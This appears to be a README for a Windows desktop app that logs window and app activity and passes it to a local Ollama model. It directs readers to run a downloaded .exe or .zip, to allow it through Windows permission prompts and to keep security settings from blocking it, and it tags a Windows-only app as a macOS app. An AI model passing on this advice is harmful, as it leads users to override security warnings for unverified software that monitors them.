# 🤖 context-assistant - Local memory for your desktop

[![Download context-assistant](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Crucial-spicecake41/context-assistant/releases)

## 🧭 Overview

context-assistant is a desktop app for Windows that helps your local AI model keep track of what you do on your computer. It watches your digital context and uses that history to help your LLM give better replies.

It runs as a desktop app with Electron and React, and it works with Ollama on your machine. That means your data stays on your device, and your local model can use recent context when you ask a question.

## ✨ What it helps with

- Keeps track of recent app and window activity
- Gives your local LLM more context from your day
- Works with Ollama on your computer
- Helps you pick up where you left off
- Keeps the setup simple for everyday use
- Runs as a Windows desktop app

## 🖥️ Windows requirements

For a smooth setup, use a Windows PC with:

- Windows 10 or Windows 11
- 8 GB RAM or more
- A recent Intel or AMD processor
- Enough free disk space for the app and your local model
- Ollama installed on the same machine

If you plan to use larger local models, 16 GB RAM gives you more room.

## 📥 Download and install

Visit this page to download:

https://github.com/Crucial-spicecake41/context-assistant/releases

1. Open the release page.
2. Find the latest release.
3. Download the Windows file from the Assets section.
4. If the file is a `.exe`, double-click it to run.
5. If the file is a `.zip`, unzip it first, then open the app file inside.

If Windows asks for permission, choose the option that lets the app run.

## ⚙️ Set up Ollama

context-assistant works with Ollama, so you need a local model ready before you use the app.

1. Install Ollama on your Windows PC.
2. Open Ollama.
3. Download a model you want to use.
4. Keep Ollama running while you use context-assistant.

A smaller model is a good start if you want faster replies. A larger model can give deeper answers if your system has enough memory.

## 🚀 First launch

After you open the app for the first time:

1. Let it start and load your local model connection.
2. Allow it to track your desktop context if Windows shows a prompt.
3. Keep the app open while you work.
4. Ask your local assistant a question based on what you were doing.

The app uses recent activity to help the model stay aware of your work, so it can respond with better continuity.

## 🧩 How it works

context-assistant sits in the background and collects useful desktop context. That can include:

- Active window changes
- App usage
- Recent work sessions
- Other local signals that help the model keep context

It then sends that context to your local LLM through Ollama. This gives your assistant a better memory of your recent tasks and lets it respond with less repetition.

## 💡 Best use cases

Use context-assistant when you want help with:

- Writing and editing
- Research and note taking
- Moving between tasks
- Picking up an unfinished project
- Remembering what you were working on earlier
- Getting answers that match your current screen and work state

## 🔒 Privacy

The app is built for local use. Your context stays on your computer, and your model runs on your machine through Ollama. That makes it a fit for users who want more control over their data.

## 🛠️ Common setup tips

If the app does not start, check these steps:

- Make sure Ollama is installed
- Make sure Ollama is running
- Confirm you downloaded the Windows release
- Try the latest release file from the release page
- Reopen the app after a restart if needed

If the app opens but does not seem to use context:

- Keep the app running in the background
- Check that desktop tracking is enabled
- Use a supported local model in Ollama
- Make sure no security setting is blocking the app

## 📁 What you will find in the release page

The release page usually includes:

- The latest Windows app build
- Version notes
- Asset files such as `.exe` or `.zip`
- Older versions if you need them

Use the newest release unless you need a past version for a specific reason.

## 🧑‍💻 About the project

This project uses:

- React for the interface
- Electron for the desktop app shell
- Ollama for local model access

It is open source, so you can review the code, follow updates, and build it yourself if you want to.

## 🔍 Topic keywords

ai-assistant, electron, llm, llms, local-llm, macos-app, ollama, open-source, privacy-first, productivity, react